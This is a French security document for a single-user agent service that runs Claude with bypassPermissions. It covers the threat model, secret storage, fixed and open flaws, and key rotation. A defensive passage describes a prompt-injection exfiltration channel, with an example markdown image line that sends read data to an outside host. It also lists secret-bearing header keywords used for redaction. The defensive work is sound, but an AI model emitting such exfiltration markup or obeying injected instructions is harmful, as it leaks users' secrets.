# Sécurité

## Ce que ce service est, et pour qui

L'Atelier est conçu pour **un pod, un utilisateur**. Il n'y a qu'une identité
propriétaire, et elle ouvre tout.

Ce n'est pas une limitation qu'on prévoit de lever au fil de l'eau : le harnais
lance `claude` avec `--permission-mode bypassPermissions`. Qui obtient un
identifiant valide obtient l'exécution de code arbitraire sur le pod, donc le
PVC, la clé du modèle, et tous les jetons amont enregistrés en base. Il n'existe
pas de « petit » accès à cette API.

Déployé pour plusieurs personnes, il faudrait que chacune ait sa propre
authentification, sans clé mutualisée derrière l'interface. **Rien dans le code
ne l'assure aujourd'hui.**

## Le modèle de menace, explicitement

| | |
|---|---|
| **Ce qui protège** | l'ingress authentifié d'Onyxia, et la clé propriétaire |
| **Ce qui ne protège pas** | l'adresse d'origine d'une requête — derrière un ingress, le service ne voit que celle du contrôleur |
| **Ce qu'un accès donne** | tout : exécution sur le pod, secrets, données |
| **Ce qui est assumé** | `bypassPermissions`, parce que l'utilisateur est le propriétaire du pod |

**Ne pas exposer ce service sans un ingress qui authentifie devant lui.**

## Où vivent les secrets

Hors du dépôt, dans `~/work/.secrets/` sur le pod, en 0600 :

- `atelier_owner_key` — la clé propriétaire, au porteur ;
- `atelier_internal_secret` — le secret partagé qui garde les appels annoncés
  comme internes ;
- `llm_api_key` — la clé de la passerelle de modèles ;
- `vscode_password` — le mot de passe code-server, enregistré par le pod.

Aucun de ces fichiers n'est versionné, et rien ne les écrit dans un dossier de
projet : un dossier de projet se partage et se versionne.

Les **identifiants des connecteurs** vivent ailleurs, à trois endroits qu'il
vaut mieux distinguer :

- **`~/work/mcp/gateway.db`**, table `server_credentials` — un `bearer`, des
  en-têtes (`headers_json`) et une URL forcée par serveur amont. **En clair** :
  il n'y a pas de chiffrement au repos, et il n'y en aurait guère l'usage
  puisque la clé vivrait sur le même disque. Le fichier est en 0600. L'API ne
  les rend jamais tels quels — `get_server_credentials_masked` masque, et tout
  en-tête dont le nom contient `authorization`, `token`, `secret`, `key`,
  `cookie` ou `password` est retiré des réponses.
- **L'environnement du service**, quand la déclaration d'un serveur nomme une
  variable (`auth_env`), avec quelques replis historiques par identifiant de
  serveur. Un jeton posé là ne passe pas par la base.
- **Les jetons OAuth que la passerelle émet elle-même** (`oauth_tokens`,
  `oauth_clients`), dans la même base. À ne pas confondre avec les précédents :
  ceux-là servent à entrer, pas à sortir.

## Ce qui a été corrigé, et pourquoi le dire

Les commentaires du code qui expliquent *pourquoi* une garde existe sont de la
documentation de sécurité. Les raccourcir revient à perdre la raison d'être du
correctif.

- **`/v1/internal/vscode-password`** n'était gardé que par l'adresse d'origine.
  Mesuré depuis Internet, la garde laissait passer : derrière l'ingress, uvicorn
  voit l'adresse du contrôleur, dans une plage privée. Un secret partagé décide
  désormais.
- **Le cookie de navigation** portait la clé propriétaire elle-même, trente
  jours durant. Il porte un identifiant de session sans pouvoir propre, daté et
  révocable côté serveur.
- **`~/.claude/settings.json`** recevait la clé du modèle en clair, pour que le
  CLI et l'extension VS Code s'authentifient sans passer par un compte
  Claude.ai. Or ce fichier se lit sans effort — c'est même une lecture banale
  quand on demande à un agent d'inspecter sa configuration — et la clé se
  retrouve alors dans son transcript, puis partout où ce transcript est relu.
  C'est arrivé. Le CLI accepte `apiKeyHelper` : une *commande* dont il lit la
  sortie. Les fichiers de réglages ne portent plus qu'un `cat` du fichier de
  secrets, et la clé ne quitte pas `~/work/.secrets/`. Une clé écrite avant ce
  correctif doit être renouvelée : le correctif l'empêche de fuir, il ne la
  déclasse pas.

- **Le rendu des messages** ne charge d'image que depuis l'Atelier lui-même.
  Une image se charge seule, sans que personne ne clique : c'est le canal
  d'exfiltration classique des interfaces de conversation. Il suffit qu'un
  agent lise une page ou un fichier piégé pour qu'on lui fasse écrire
  `![](https://ailleurs/?d=<ce-qu-il-vient-de-lire>)`, et le navigateur part
  le livrer en silence au moment de l'affichage. Ici les agents tournent en
  `bypassPermissions` et lisent ce qu'ils veulent : le canal serait large. Une
  image d'ailleurs devient donc un lien, que l'on voit avant de le suivre.
  Vérifié dans le navigateur : au rendu d'un message qui en contient une,
  aucune requête ne part vers l'hôte tiers.
## Ce qui reste ouvert

Un projet qui porte des défauts connus, nommés et situés est un projet tenu.
Ceux-ci viennent d'une revue externe ; l'état donné est celui du code, vérifié,
pas celui de la note d'origine.

### Ouvert

Les trois défauts que la revue avait relevés sont fermés. Ce qui reste tient
au modèle, pas à un oubli : un pod, une identité, `bypassPermissions`. C'est
dit plus haut, et ça ne se corrige pas par un correctif.

### Déclassé

- **`is_internal_request` accepte toute adresse en `172.`**, alors que la plage
  privée s'arrête à 172.31. Depuis que le point d'entrée interne est gardé par
  un secret partagé, cette fonction ne décide plus d'aucun accès : elle ne
  qualifie plus qu'une ligne de journal. À corriger pour la justesse, plus pour
  la sûreté.

### Fermé

- **La clé propriétaire circulait en paramètre d'URL.** `streamEvents` la
  plaçait dans l'adresse du flux SSE à chaque message envoyé. Observé en
  conditions réelles : elle est apparue en clair dans le journal du service.
  Une URL traverse aussi les journaux d'ingress, l'historique du navigateur et
  le `Referer`. `EventSource` ne sait pas poser d'en-tête, d'où la tentation —
  mais le cookie de session part de lui-même en même origine. L'interface ne
  l'écrit plus, **et** la route ne l'accepte plus : la laisser « au cas où »
  aurait gardé la fuite ouverte pour une page restée ouverte ailleurs. Le
  WebSocket du proxy VS Code l'acceptait aussi sans que rien ne l'envoie ; il
  ne prend plus que le cookie. Vérifié dans le navigateur : la requête part
  sans jeton et rend 200.

- **La clé propriétaire ne pouvait pas être renouvelée.** Il fallait se
  connecter au pod et éditer un fichier — ce que personne ne fait à chaud, or
  une clé se renouvelle précisément parce qu'elle vient de fuir.
  `POST /v1/auth/rotate` la remplace et rend la nouvelle. Les sessions de
  navigation ouvertes avec l'ancienne tombent avec elle, y compris celle qui
  demande : les garder reviendrait à ne rien changer pour qui détient
  l'ancienne. L'écriture passe par un fichier voisin puis un remplacement d'un
  seul geste, pour qu'aucune requête ne tombe sur un fichier à moitié écrit et
  n'en fabrique une troisième.

- **Le proxy `/vscode` relayait les identifiants de sa propre porte.** Il
  retransmettait les en-têtes du navigateur, `Authorization` et `Cookie`
  compris, vers code-server — qui n'en a aucun usage : il tourne sous sa propre
  authentification, et le proxy s'y connecte avec sa session à lui. Les deux
  en-têtes sont désormais retirés avant transmission.

  Ce n'était d'ailleurs pas qu'une question d'hygiène. Mesuré : `httpx` laisse
  un en-tête `Cookie` explicite l'emporter sur le pot de cookies du client. Le
  cookie du navigateur **déplaçait** donc la session que le proxy avait ouverte
  auprès de code-server. Le correctif répare les deux à la fois.
- **`attachment_ids` était utilisé avant d'être défini** dans `stream_events` :
  un message vide levait un `UnboundLocalError` et rendait un 500. Corrigé.
- **Aucun test automatisé.** La suite existe, et couvre en premier lieu ce que
  la revue réclamait : le point d'entrée interne refusé depuis l'extérieur.

## Signaler une faille

Par courriel à l'adresse de l'auteur du dépôt, plutôt qu'en issue publique s'il
s'agit d'un défaut exploitable. Ce projet est maintenu par une personne, sur son
temps ; il n'y a pas de délai de réponse garanti.
